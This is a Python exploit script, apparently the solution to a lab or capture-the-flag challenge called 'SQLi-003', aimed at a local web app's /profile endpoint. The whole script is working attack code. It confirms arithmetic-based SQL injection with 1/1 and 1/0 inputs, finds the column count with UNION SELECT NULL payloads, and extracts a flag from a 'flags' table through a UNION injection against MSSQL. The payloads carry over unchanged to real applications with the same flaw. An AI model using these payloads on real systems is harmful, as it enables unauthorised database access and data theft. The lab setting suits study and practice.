#!/usr/bin/env python3
"""
SQLi-003 Exploit Script
Arithmetic-based SQL Injection Detection and Flag Extraction (MSSQL)
"""

import requests
import sys
import re

TARGET = "http://localhost:5003"

def test_arithmetic():
    """Test for arithmetic-based SQL Injection"""
    print("[*] Testing for Arithmetic-based SQL Injection...")
    
    # Test 1/1 (should work normally)
    r1 = requests.get(f"{TARGET}/profile", params={"id": "1/1"})
    has_profile_1 = "John" in r1.text or "employee" in r1.text.lower()
    
    # Test 1/0 (should cause error)
    r2 = requests.get(f"{TARGET}/profile", params={"id": "1/0"})
    has_error = "divide by zero" in r2.text.lower() or "error" in r2.text.lower()
    
    # Test 2-1 (should return employee 1)
    r3 = requests.get(f"{TARGET}/profile", params={"id": "2-1"})
    
    print(f"    1/1 returns profile: {has_profile_1}")
    print(f"    1/0 causes error: {has_error}")
    
    if has_profile_1 and has_error:
        print("[+] VULNERABLE! Arithmetic-based SQLi confirmed")
        print("[+] Database appears to be MSSQL")
        return True
    
    return False

def detect_columns():
    """Detect number of columns"""
    print("\n[*] Detecting columns...")
    
    for i in range(1, 15):
        nulls = ",".join(["NULL"] * i)
        payload = f"0 UNION SELECT {nulls}--"
        r = requests.get(f"{TARGET}/profile", params={"id": payload})
        
        if "error" not in r.text.lower() and "incorrect" not in r.text.lower():
            print(f"[+] Found {i} columns")
            return i
    
    return 8  # Default for this lab

def extract_flag(num_columns):
    """Extract flag using UNION injection"""
    print("\n[*] Extracting flag...")
    
    # Build payload for 8 columns
    payload = f"0 UNION SELECT 1,'FLAG',flag_value,'flag','flags','ctf','555-0000',GETDATE() FROM flags--"
    
    r = requests.get(f"{TARGET}/profile", params={"id": payload})
    
    flag_match = re.search(r'FLAG\{[^}]+\}', r.text)
    if flag_match:
        return flag_match.group(0)
    
    return None

def main():
    print("=" * 60)
    print("SQLi-003 Exploit - Arithmetic-based Detection (MSSQL)")
    print("=" * 60)
    
    if not test_arithmetic():
        print("[-] Could not confirm vulnerability")
        sys.exit(1)
    
    num_cols = detect_columns()
    
    flag = extract_flag(num_cols)
    if flag:
        print(f"\n[+] FLAG FOUND: {flag}")
    else:
        print("\n[-] Could not extract flag automatically")
        print("[*] Try manual UNION SELECT with 8 columns")

if __name__ == "__main__":
    main()
